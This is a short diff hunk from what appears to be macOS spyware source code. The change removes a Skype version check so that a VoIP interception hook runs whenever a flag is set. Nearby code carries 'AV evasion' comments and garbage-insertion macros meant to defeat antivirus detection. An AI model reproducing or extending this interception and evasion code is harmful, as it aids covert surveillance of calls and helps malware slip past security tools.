@@ -1517,7 +1517,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       AV_GARBAGE_009
     }
     
-    if (voipFlag == 1 && isSkypeVersionSupported())
+    //if (voipFlag == 1 && isSkypeVersionSupported())
+    if (voipFlag == 1)
     {   
       // AV evasion: only on release build
       AV_GARBAGE_006 
